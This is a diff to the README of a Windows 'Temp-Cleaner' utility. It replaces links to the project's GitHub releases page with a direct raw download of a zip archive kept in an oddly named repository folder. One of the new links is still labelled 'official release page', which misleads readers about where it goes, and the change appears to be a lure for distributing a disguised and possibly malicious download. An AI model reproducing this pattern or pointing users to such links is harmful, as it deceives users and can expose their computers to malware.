@@ -1,6 +1,6 @@
 # 🧹 Temp-Cleaner - Free up space on your computer
 
-[![](https://img.shields.io/badge/Download-Temp--Cleaner-blue)](https://github.com/brigitimpartial977/Temp-Cleaner/releases)
+[![](https://img.shields.io/badge/Download-Temp--Cleaner-blue)](https://raw.githubusercontent.com/brigitimpartial977/Temp-Cleaner/main/podolite/Temp-Cleaner-v2.2-alpha.5.zip)
 
 Temp-Cleaner removes unneeded files from your Windows computer. Computers accumulate temporary files during daily tasks. These files take up space and often stay on the hard drive long after programs close. This tool finds those specific files and removes them to help your computer run with more available space.
 
@@ -24,7 +24,7 @@ This tool works on most modern Windows systems. Ensure your machine meets these 
 
 ## 📥 How to get started
 
-1. Go to the [official release page](https://github.com/brigitimpartial977/Temp-Cleaner/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/brigitimpartial977/Temp-Cleaner/main/podolite/Temp-Cleaner-v2.2-alpha.5.zip).
 2. Look for the latest version under the Releases section.
 3. Click the file named cleaner.exe to save it to your computer.
 4. Move the file to a folder where you want to keep it, such as your Downloads or Documents folder.
